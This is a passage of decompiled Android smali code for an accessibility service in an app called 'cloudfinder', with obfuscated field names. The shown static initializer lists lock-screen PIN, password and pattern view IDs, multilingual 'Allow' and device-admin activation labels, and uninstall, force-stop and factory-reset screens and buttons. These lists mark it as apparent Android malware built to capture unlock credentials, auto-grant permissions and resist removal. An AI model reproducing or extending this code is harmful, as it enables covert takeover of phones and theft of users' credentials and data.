.class public Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "SourceFile"


# static fields
.field public static final ا:Ljava/util/concurrent/ExecutorService;

.field public static volatile ب:Ljava/lang/Boolean;

.field public static volatile ة:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static volatile ت:Landroidx/constraintlayout/motion/widget/؋;

.field public static volatile ث:Ljava/lang/String;

.field public static final ج:Ljava/util/concurrent/ExecutorService;

.field public static volatile ح:J

.field public static volatile خ:J

.field public static final د:Ljava/util/HashSet;

.field public static final ذ:Ljava/util/HashSet;

.field public static final ر:[Ljava/lang/String;

.field public static volatile ز:Z

.field public static final س:[Ljava/lang/String;

.field public static final ش:Ljava/lang/StringBuilder;

.field public static final ص:Ljava/lang/StringBuilder;

.field public static volatile ض:Z

.field public static final ط:Ljava/util/HashMap;

.field public static final ظ:Ljava/util/HashSet;

.field public static final ع:[Ljava/lang/String;

.field public static غ:Ljava/lang/String;

.field public static ػ:J

.field public static volatile ؼ:I

.field public static final ؽ:[Ljava/lang/String;

.field public static final ؾ:[Ljava/lang/String;

.field public static final ؿ:[Ljava/lang/String;

.field public static final ـ:[Ljava/lang/String;

.field public static final ف:Ljava/util/HashSet;

.field public static final ق:[Ljava/lang/String;

.field public static final ك:[Ljava/lang/String;

.field public static final ل:[Ljava/lang/String;


# instance fields
.field public ؋:Lژة۪ڦضۆۿۡ/ط;

.field public ؠ:J

.field public ء:Ljava/lang/String;

.field public آ:J

.field public أ:J

.field public ؤ:J

.field public إ:J

.field public volatile ئ:I


# direct methods
.method public static constructor <clinit>()V
    .locals 78

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ب:Ljava/lang/Boolean;

    const/4 v0, 0x0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ت:Landroidx/constraintlayout/motion/widget/؋;

    const-string v0, ""

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ث:Ljava/lang/String;

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v1

    sput-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ج:Ljava/util/concurrent/ExecutorService;

    const-wide/16 v1, 0x0

    sput-wide v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح:J

    sput-wide v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->خ:J

    new-instance v3, Ljava/util/HashSet;

    const-string v4, "com.android.packageinstaller"

    const-string v5, "com.google.android.packageinstaller"

    const-string v6, "com.samsung.android.packageinstaller"

    const-string v7, "com.miui.packageinstaller"

    const-string v8, "com.xiaomi.packageinstaller"

    const-string v9, "com.oppo.packageinstaller"

    const-string v10, "com.coloros.packageinstaller"

    const-string v11, "com.oplus.packageinstaller"

    const-string v12, "com.oneplus.packageinstaller"

    const-string v13, "com.realme.packageinstaller"

    const-string v14, "com.vivo.packageinstaller"

    const-string v15, "com.huawei.packageinstaller"

    const-string v16, "com.honor.packageinstaller"

    const-string v17, "com.motorola.packageinstaller"

    const-string v18, "com.lenovo.packageinstaller"

    const-string v19, "com.hmd.packageinstaller"

    const-string v20, "com.sonymobile.packageinstaller"

    const-string v21, "com.asus.packageinstaller"

    const-string v22, "com.lge.packageinstaller"

    const-string v23, "com.zte.packageinstaller"

    const-string v24, "com.transsion.packageinstaller"

    const-string v25, "com.tecno.packageinstaller"

    const-string v26, "com.infinix.packageinstaller"

    const-string v27, "com.nothing.packageinstaller"

    const-string v28, "com.tcl.packageinstaller"

    const-string v29, "com.meizu.packageinstaller"

    const-string v30, "com.google.android.permissioncontroller"

    const-string v31, "com.android.vending"

    const-string v32, "com.sec.android.app.samsungapps"

    const-string v33, "com.amazon.venezia"

    const-string v34, "com.huawei.appmarket"

    const-string v35, "com.hihonor.appmarket"

    const-string v36, "com.heytap.market"

    const-string v37, "com.oppo.market"

    const-string v38, "com.coloros.market"

    const-string v39, "com.vivo.appstore"

    const-string v40, "com.bbk.appstore"

    const-string v41, "com.xiaomi.mipicks"

    const-string v42, "com.xiaomi.market"

    const-string v43, "com.asus.appmarket"

    const-string v44, "com.meizu.mstore"

    const-string v45, "com.transsnet.store"

    const-string v46, "com.lge.lgworld"

    const-string v47, "com.sonymobile.sonyselect"

    const-string v48, "org.fdroid.fdroid"

    const-string v49, "com.aurora.store"

    const-string v50, "com.apkpure.aegon"

    const-string v51, "cm.aptoide.pt"

    filled-new-array/range {v4 .. v51}, [Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د:Ljava/util/HashSet;

    new-instance v3, Ljava/util/HashSet;

    const-string v4, "com.android.settings"

    const-string v5, "com.miui.securitycenter"

    const-string v6, "com.miui.securityadd"

    const-string v7, "com.samsung.android.sm"

    const-string v8, "com.samsung.android.lool"

    const-string v9, "com.samsung.android.sm_cn"

    const-string v10, "com.samsung.android.settings"

    const-string v11, "com.samsung.accessibility"

    const-string v12, "com.coloros.safecenter"

    const-string v13, "com.oppo.safe"

    const-string v14, "com.oplus.permissioncontroller"

    const-string v15, "com.vivo.abe"

    const-string v16, "com.vivo.permissionmanager"

    const-string v17, "com.huawei.systemmanager"

    const-string v18, "com.huawei.permissioncontroller"

    const-string v19, "com.honor.smart"

    const-string v20, "com.honor.permissioncontroller"

    const-string v21, "com.asus.mobilemanager"

    const-string v22, "com.transsion.phonemanager"

    const-string v23, "com.transsion.phonemaster"

    const-string v24, "com.meizu.safe"

    const-string v25, "com.google.android.permissioncontroller"

    const-string v26, "com.android.permissioncontroller"

    const-string v27, "com.android.settings.DeviceAdminAdd"

    const-string v28, "com.samsung.android.sm.battery"

    const-string v29, "com.samsung.android.applock"

    const-string v30, "com.samsung.android.mydevice"

    const-string v31, "com.samsung.android.sm.devicesecurity"

    const-string v32, "com.miui.powerkeeper"

    const-string v33, "com.miui.cleanmaster"

    const-string v34, "com.miui.guardprovider"

    const-string v35, "com.oneplus.security"

    const-string v36, "com.coloros.oppoguardelf"

    const-string v37, "com.oplus.safecenter"

    const-string v38, "com.coloros.phonemanager"

    const-string v39, "com.heytap.market"

    const-string v40, "com.iqoo.secure"

    const-string v41, "com.vivo.imanager"

    const-string v42, "com.vivo.widget.cleanspeed"

    const-string v43, "com.hihonor.systemmanager"

    const-string v44, "com.huawei.securitymgr"

    const-string v45, "com.huawei.imanager"

    const-string v46, "com.transsion.phonemanager"

    const-string v47, "com.transsion.phonemaster"

    const-string v48, "com.transsnet.store"

    const-string v49, "com.hmd.devicepoweroptimizer"

    const-string v50, "com.evenwell.powersaving.g3"

    const-string v51, "com.motorola.actions"

    const-string v52, "com.asus.mobilemanager"

    const-string v53, "com.meizu.safe"

    const-string v54, "com.lge.sizechangable.weather"

    const-string v55, "com.sonymobile.cta"

    const-string v56, "com.zte.heartyservice"

    filled-new-array/range {v4 .. v56}, [Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ:Ljava/util/HashSet;

    new-instance v3, Ljava/util/HashSet;

    const-string v4, "com.android.settings.Settings$FactoryResetConfirmActivity"

    const-string v5, "com.android.settings.MasterClear"

    const-string v6, "com.android.settings.Settings$FactoryResetActivity"

    const-string v7, "com.android.settings.MasterClearConfirm"

    const-string v8, "com.google.android.setupwizard.user.FactoryResetActivity"

    filled-new-array {v6, v4, v5, v7, v8}, [Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    new-instance v3, Ljava/util/HashSet;

    const-string v4, "com.android.settings.Settings$AccessibilitySettingsActivity"

    const-string v5, "com.android.settings.Settings$AccessibilityServiceSettingsActivity"

    const-string v6, "com.android.settings.Settings$AccessibilityInstalledServiceActivity"

    const-string v7, "com.android.settings.Settings$AccessibilityDetailsSettingsActivity"

    const-string v8, "com.android.settings.accessibility.AccessibilitySettingsForSetupWizardActivity"

    const-string v9, "com.samsung.android.settings.accessibility.installed.InstalledAccessibilityServiceActivity"

    const-string v10, "com.android.permissioncontroller.permission.ui.ReviewAccessibilityServicesActivity"

    const-string v11, "com.google.android.permissioncontroller.permission.ui.ReviewAccessibilityServicesActivity"

    filled-new-array/range {v4 .. v11}, [Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    const-string v5, ".*clearAnimView"

    const-string v6, ".*btn_clear"

    const-string v7, ".*clear_all"

    const-string v8, ".*tips_clear"

    const-string v9, ".*btnBottomClearAll"

    const-string v10, ".*clear_and_ram_progress"

    const-string v11, ".*ts_btn_recents_clear"

    const-string v12, ".*clear_button"

    const-string v13, ".*clear_all_button"

    const-string v14, ".*clearAll"

    const-string v15, ".*action_icon1"

    filled-new-array/range {v5 .. v15}, [Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ر:[Ljava/lang/String;

    const/4 v3, 0x0

    sput-boolean v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    const-string v4, "com.android.systemui"

    const-string v5, "com.huawei.systemui"

    const-string v6, "com.sec.android.app.keyguard"

    const-string v7, "com.samsung.android.keyguard"

    const-string v8, "com.miui.keyguard"

    const-string v9, "com.coloros.keyguard"

    const-string v10, "com.coloros.systemui"

    const-string v11, "com.oppo.keyguard"

    const-string v12, "com.oppo.systemui"

    const-string v13, "com.oplus.systemui"

    const-string v14, "com.android.bbk.lockscreen3"

    const-string v15, "com.bbk.lockscreen"

    const-string v16, "com.bbk.systemui"

    const-string v17, "com.vivo.keyguard"

    const-string v18, "com.vivo.systemui"

    const-string v19, "com.oneplus.systemui"

    const-string v20, "com.realme.systemui"

    const-string v21, "com.lge.systemui"

    const-string v22, "com.lge.keyguard"

    const-string v23, "com.asus.systemui"

    const-string v24, "com.motorola.systemui"

    const-string v25, "com.sonymobile.systemui"

    const-string v26, "com.lenovo.systemui"

    const-string v27, "com.transsion.systemui"

    const-string v28, "com.sec.android.app.launcher"

    const-string v29, "com.android.keyguard"

    const-string v30, "com.samsung.android.biometrics.app.setting"

    const-string v31, "com.android.settings"

    filled-new-array/range {v4 .. v31}, [Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->س:[Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ش:Ljava/lang/StringBuilder;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ص:Ljava/lang/StringBuilder;

    sput-boolean v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ض:Z

    new-instance v4, Ljava/util/HashMap;

    invoke-direct {v4}, Ljava/util/HashMap;-><init>()V

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ط:Ljava/util/HashMap;

    new-instance v4, Ljava/util/HashSet;

    invoke-direct {v4}, Ljava/util/HashSet;-><init>()V

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ظ:Ljava/util/HashSet;

    const-string v5, "0"

    const-string v6, "1"

    const-string v7, "2"

    const-string v8, "3"

    const-string v9, "4"

    const-string v10, "5"

    const-string v11, "6"

    const-string v12, "7"

    const-string v13, "8"

    const-string v14, "9"

    filled-new-array/range {v5 .. v14}, [Ljava/lang/String;

    move-result-object v4

    move v5, v3

    :goto_0
    const/16 v6, 0xa

    if-ge v5, v6, :cond_0

    aget-object v6, v4, v5

    sget-object v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ط:Ljava/util/HashMap;

    sget-object v8, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-virtual {v7, v6, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_0
    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ط:Ljava/util/HashMap;

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v6, "Enter"

    invoke-virtual {v4, v6, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "OK"

    invoke-virtual {v4, v6, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ظ:Ljava/util/HashSet;

    const-string v5, "Delete"

    const-string v6, "DELETE, Double tap and hold to DELETE."

    const-string v7, "\u5220\u9664"

    const-string v8, "delete"

    invoke-static {v4, v5, v6, v7, v8}, Landroidx/activity/result/؋;->ر(Ljava/util/HashSet;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v9, "passwordEntry"

    const-string v10, "password_entry"

    const-string v11, "passwordEntryView"

    const-string v12, "passwordInputView"

    const-string v13, "securityEditText"

    const-string v14, "miui_mixed_password_input_field"

    const-string v15, "miui_password_entry"

    const-string v16, "lockPassword"

    const-string v17, "hw_password"

    const-string v18, "emui_password"

    const-string v19, "keyguard_password"

    const-string v20, "mixed_password"

    const-string v21, "pinEntry"

    const-string v22, "pin_entry"

    const-string v23, "pinEntryView"

    const-string v24, "simPinEntry"

    const-string v25, "pukEntry"

    const-string v26, "miui_pin_entry"

    const-string v27, "numeric_inputview"

    const-string v28, "lockPatternView"

    const-string v29, "patternView"

    const-string v30, "pattern_view"

    const-string v31, "colorLockPatternView"

    const-string v32, "miui_lock_pattern_view"

    filled-new-array/range {v9 .. v32}, [Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ع:[Ljava/lang/String;

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ:Ljava/lang/String;

    sput-wide v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ:J

    sput v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؼ:I

    const-string v5, "Allow"

    const-string v6, "ALLOW"

    const-string v7, "Allow all"

    const-string v8, "ALLOW ALL"

    const-string v9, "While using the app"

    const-string v10, "While using this app"

    const-string v11, "Only this time"

    const-string v12, "Allow always"

    const-string v13, "\u5141\u8bb8"

    const-string v14, "\u59cb\u7ec8\u5141\u8bb8"

    const-string v15, "\u4ec5\u5728\u4f7f\u7528\u4e2d\u5141\u8bb8"

    const-string v16, "\u4ec5\u6b64\u4e00\u6b21"

    const-string v17, "\u5168\u90e8\u5141\u8bb8"

    const-string v18, "\u4fdd\u6301\u5f00\u542f\u72b6\u6001"

    const-string v19, "\u4fdd\u6301\u5f00\u542f"

    const-string v20, "Keep enabled"

    const-string v21, "Keep on"

    const-string v22, "\ud5c8\uc6a9"

    const-string v23, "\uc571 \uc0ac\uc6a9 \uc911\uc5d0\ub9cc \ud5c8\uc6a9"

    const-string v24, "\ud56d\uc0c1 \ud5c8\uc6a9"

    const-string v25, "\u8a31\u53ef"

    const-string v26, "\u30a2\u30d7\u30ea\u306e\u4f7f\u7528\u4e2d\u306e\u307f\u8a31\u53ef"

    const-string v27, "\u5e38\u306b\u8a31\u53ef"

    const-string v28, "Permitir"

    const-string v29, "Permitir siempre"

    const-string v30, "Solo con la app en uso"

    const-string v31, "Solo esta vez"

    const-string v32, "Permitir"

    const-string v33, "Permitir sempre"

    const-string v34, "S\u00f3 com o app em uso"

    const-string v35, "Autoriser"

    const-string v36, "Toujours autoriser"

    const-string v37, "Uniquement en cours d\'utilisation"

    const-string v38, "Erlauben"

    const-string v39, "Zulassen"

    const-string v40, "Immer zulassen"

    const-string v41, "Nur bei Nutzung der App"

    const-string v42, "Consenti"

    const-string v43, "Consenti sempre"

    const-string v44, "Solo durante l\'uso dell\'app"

    const-string v45, "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c"

    const-string v46, "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c \u0432\u0441\u0435\u0433\u0434\u0430"

    const-string v47, "\u0422\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0438"

    const-string v48, "\u0130zin ver"

    const-string v49, "Her zaman izin ver"

    const-string v50, "Cho ph\u00e9p"

    const-string v51, "Lu\u00f4n cho ph\u00e9p"

    const-string v52, "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15"

    const-string v53, "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e15\u0e25\u0e2d\u0e14\u0e40\u0e27\u0e25\u0e32"

    const-string v54, "Izinkan"

    const-string v55, "Selalu izinkan"

    const-string v56, "Hanya saat menggunakan"

    const-string v57, "\u0905\u0928\u0941\u092e\u0924\u093f \u0926\u0947\u0902"

    const-string v58, "\u0939\u092e\u0947\u0936\u093e \u0905\u0928\u0941\u092e\u0924\u093f \u0926\u0947\u0902"

    const-string v59, "\u0910\u092a \u0907\u0938\u094d\u0924\u0947\u092e\u093e\u0932 \u0915\u0947 \u0926\u094c\u0930\u093e\u0928 \u0939\u0940"

    const-string v60, "\u0627\u0644\u0633\u0645\u0627\u062d"

    const-string v61, "\u0627\u0644\u0633\u0645\u0627\u062d \u062f\u0627\u0626\u0645\u064b\u0627"

    const-string v62, "\u0623\u062b\u0646\u0627\u0621 \u0627\u0633\u062a\u062e\u062f\u0627\u0645 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0641\u0642\u0637"

    const-string v63, "Toestaan"

    const-string v64, "Altijd toestaan"

    const-string v65, "Zezw\u00f3l"

    const-string v66, "Zezwalaj zawsze"

    const-string v67, "Benarkan"

    const-string v68, "Sentiasa benarkan"

    const-string v69, "\u0985\u09a8\u09c1\u09ae\u09a4\u09bf \u09a6\u09bf\u09a8"

    const-string v70, "Payagan"

    const-string v71, "Laging payagan"

    const-string v72, "\u1001\u103d\u1004\u1037\u103a\u1015\u103c\u102f\u101b\u1014\u103a"

    const-string v73, "\u17a2\u1793\u17bb\u1789\u17d2\u1789\u17b6\u178f"

    const-string v74, "\u05d0\u05e4\u05e9\u05e8"

    const-string v75, "\u0627\u062c\u0627\u0632\u062a \u062f\u06cc\u06ba"

    const-string v76, "Ruhusu"

    const-string v77, "\u0905\u0928\u0941\u092e\u0924\u093f \u0926\u093f\u0928\u0941\u0939\u094b\u0938\u094d"

    filled-new-array/range {v5 .. v77}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؽ:[Ljava/lang/String;

    const-string v1, "\u6fc0\u6d3b\u8bbe\u5907\u7ba1\u7406"

    const-string v2, "\u8bbe\u5907\u7ba1\u7406"

    const-string v3, "\u542f\u7528\u8bbe\u5907\u7ba1\u7406"

    const-string v4, "Device admin"

    const-string v5, "device admin"

    const-string v6, "Activate device"

    const-string v7, "\u30c7\u30d0\u30a4\u30b9\u7ba1\u7406"

    const-string v8, "\uae30\uae30 \uad00\ub9ac\uc790"

    const-string v9, "\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440"

    const-string v10, "\u6e05\u9664\u624b\u673a\u4e0a\u7684\u6240\u6709\u6570\u636e"

    const-string v11, "\u76d1\u63a7\u548c\u63a7\u5236\u9501\u5c4f\u5bc6\u7801"

    const-string v12, "\u7981\u7528\u6444\u50cf\u5934"

    const-string v13, "\u6e05\u9664\u624b\u673a\u4e0a\u7684\u6240\u6709\u6570\u636e"

    const-string v14, "\u76d1\u63a7\u548c\u63a7\u5236\u9501\u5c4f\u5bc6\u7801"

    const-string v15, "Erase all data"

    const-string v16, "Monitor screen-unlock"

    const-string v17, "Disable camera"

    const-string v18, "Wipe all data"

    const-string v19, "Monitor lock screen"

    const-string v20, "Disable the camera"

    filled-new-array/range {v1 .. v20}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؾ:[Ljava/lang/String;

    const-string v1, "\u542f\u52a8"

    const-string v2, "\u6fc0\u6d3b"

    const-string v3, "\u5f00\u542f"

    const-string v4, "\u786e\u5b9a"

    const-string v5, "\u786e\u8ba4"

    const-string v6, "\u542f\u7528"

    const-string v7, "Activate"

    const-string v8, "activate"

    const-string v9, "Enable"

    const-string v10, "enable"

    const-string v11, "OK"

    const-string v12, "Confirm"

    const-string v13, "\u0938\u0915\u094d\u0930\u093f\u092f \u0915\u0930\u0947\u0902"

    const-string v14, "\u091a\u093e\u0932\u0942 \u0915\u0930\u0947\u0902"

    const-string v15, "\u062a\u0641\u0639\u064a\u0644"

    const-string v16, "\u062a\u0646\u0634\u064a\u0637"

    const-string v17, "Activar"

    const-string v18, "Ativar"

    const-string v19, "\u0410\u043a\u0442\u0438\u0432\u0438\u0440\u043e\u0432\u0430\u0442\u044c"

    const-string v20, "\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c"

    const-string v21, "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19"

    const-string v22, "K\u00edch ho\u1ea1t"

    const-string v23, "B\u1eadt"

    const-string v24, "Aktifkan"

    const-string v25, "Etkinle\u015ftir"

    const-string v26, "\ud65c\uc131\ud654"

    const-string v27, "\u6709\u52b9\u306b\u3059\u308b"

    const-string v28, "Activer"

    const-string v29, "Aktivieren"

    const-string v30, "Attiva"

    const-string v31, "\u09b8\u0995\u09cd\u09b0\u09bf\u09af\u09bc \u0995\u09b0\u09c1\u09a8"

    const-string v32, "\u0641\u0639\u0627\u0644 \u06a9\u0631\u06cc\u06ba"

    const-string v33, "I-activate"

    const-string v34, "\u1792\u17d2\u179c\u17be\u17b1\u17d2\u1799\u179f\u1780\u1798\u17d2\u1798"

    const-string v35, "\u0938\u0915\u094d\u0930\u093f\u092f \u0917\u0930\u094d\u0928\u0941\u0939\u094b\u0938\u094d"

    const-string v36, "\u1016\u103d\u1004\u1037\u103a\u101b\u1014\u103a"

    filled-new-array/range {v1 .. v36}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؿ:[Ljava/lang/String;

    const-string v1, "Allow access to manage all files"

    const-string v2, "Manage all files"

    const-string v3, "Storage permission"

    const-string v4, "Special app access"

    const-string v5, "RECENTLY SENT"

    const-string v6, "Reset options"

    const-string v7, "Remove from Home screen"

    const-string v8, "App will be uninstalled"

    const-string v9, "Uninstall for all users"

    const-string v10, "Remove from MIUI"

    const-string v11, "Delete from device"

    const-string v12, "Remove from launcher"

    const-string v13, "Turn off"

    const-string v14, "Disable service"

    const-string v15, "Stop service"

    const-string v16, "Service will be disabled"

    const-string v17, "Battery optimization"

    const-string v18, "Optimize battery usage"

    const-string v19, "Restrict background"

    const-string v20, "Revoke permissions"

    const-string v21, "Remove all permissions"

    const-string v22, "Reset app preferences"

    const-string v23, "Background check"

    const-string v24, "Reset apps"

    const-string v25, "Don\'t keep activities"

    const-string v26, "Reset all settings"

    const-string v27, "Reset accessibility settings"

    const-string v28, "Wipe data"

    const-string v29, "Delete all data"

    const-string v30, "Force stop"

    const-string v31, "Clear data"

    const-string v32, "Clear storage"

    const-string v33, "Clear cache"

    const-string v34, "Delete app data"

    const-string v35, "Storage cleared"

    const-string v36, "Remove app"

    const-string v37, "Delete app"

    const-string v38, "Erase all data?"

    const-string v39, "Erase all data"

    const-string v40, "Factory data reset"

    const-string v41, "Factory reset"

    filled-new-array/range {v1 .. v41}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ـ:[Ljava/lang/String;

    const-string v1, "com.android.settings:id/reset_soft_button"

    const-string v2, "com.android.settings:id/button1"

    const-string v3, "android:id/button1"

    const-string v4, "android:id/button2"

    const-string v5, "android:id/switch_widget"

    const-string v6, "com.android.settings:id/main_switch_bar"

    const-string v7, "com.samsung.accessibility:id/sesl_switchbar_container"

    const-string v8, "com.sec.android.app.launcher:id/global_option_item"

    const-string v9, "com.android.settings:id/switch_bar"

    const-string v10, "com.sec.android.app.launcher:id/uninstall_target_text"

    const-string v11, "com.google.android.apps.nexuslauncher:id/uninstall_target_text"

    const-string v12, "com.google.android.packageinstaller:id/permission_allow_button"

    const-string v13, "com.miui.securitycenter:id/uninstall_button"

    const-string v14, "com.miui.YUnDwu31BQ:id/uninstall_target_text"

    const-string v15, "android:id/miui_dialog_button1"

    const-string v16, "com.miui.securitycenter:id/auto_start_list"

    const-string v17, "com.miui.YUnDwu31BQ:id/uninstall_drop_target"

    const-string v18, "com.android.launcher:id/btn_positive"

    const-string v19, "com.oppo.launcher:id/btn_positive"

    const-string v20, "com.coloros.safecenter:id/button_allow"

    const-string v21, "com.vivo.permissionmanager:id/permission_allow_button"

    const-string v22, "com.bbk.launcher2:id/uninstall_target_text"

    const-string v23, "com.realme.securitycenter:id/permission_button"

    const-string v24, "com.huawei.android.launcher:id/action_name"

    const-string v25, "com.hihonor.systemmanager:id/permission_allow"

    const-string v26, "net.oneplus.launcher:id/uninstall_target_text"

    const-string v27, "com.oneplus.security:id/allow_button"

    const-string v28, "com.android.systemui:id/fgs_manager_app_item_stop_button"

    const-string v29, "com.android.settings:id/button2"

    const-string v30, "com.android.settings:id/button3"

    const-string v31, "com.android.settings:id/main_frame"

    const-string v32, "android:id/alertTitle"

    const-string v33, "com.realme.launcher:id/uninstall_target_text"

    filled-new-array/range {v1 .. v33}, [Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/util/HashSet;

    invoke-static {v0}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ف:Ljava/util/HashSet;

    const-string v2, "\u5e94\u7528\u7a0b\u5e8f ("

    const-string v3, "Applications ("

    const-string v4, "Aplicaciones ("

    const-string v5, "Aplicativos ("

    const-string v6, "Anwendungen ("

    const-string v7, "\u041f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f ("

    const-string v8, "Aplikasi ("

    const-string v9, "\u1ee8ng d\u1ee5ng ("

    const-string v10, "\u0e41\u0e2d\u0e1b\u0e1e\u0e25\u0e34\u0e40\u0e04\u0e0a\u0e31\u0e19 ("

    const-string v11, "\uc560\ud50c\ub9ac\ucf00\uc774\uc158 ("

    const-string v12, "\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3 ("

    const-string v13, "Uygulamalar ("

    const-string v14, "\u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a ("

    const-string v15, "App ("

    const-string v16, "Apps ("

    filled-new-array/range {v2 .. v16}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ق:[Ljava/lang/String;

    const-string v1, "App list"

    const-string v2, "All apps"

    const-string v3, "Manage applications"

    const-string v4, "Installed apps"

    const-string v5, "See all apps"

    const-string v6, "\u5e94\u7528\u7ba1\u7406"

    const-string v7, "\u5168\u90e8\u5e94\u7528"

    const-string v8, "\u5df2\u5b89\u88c5\u5e94\u7528"

    const-string v9, "\u5e94\u7528\u5217\u8868"

    const-string v10, "\u61c9\u7528\u7ba1\u7406"

    const-string v11, "\u5168\u90e8\u61c9\u7528"

    const-string v12, "Administrar aplicaciones"

    const-string v13, "Todas las aplicaciones"

    const-string v14, "Gerenciar aplicativos"

    const-string v15, "Todos os aplicativos"

    const-string v16, "G\u00e9rer les applications"

    const-string v17, "Toutes les applications"

    const-string v18, "Apps verwalten"

    const-string v19, "Alle Apps"

    const-string v20, "Gestisci applicazioni"

    const-string v21, "Tutte le app"

    const-string v22, "\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\u043c\u0438"

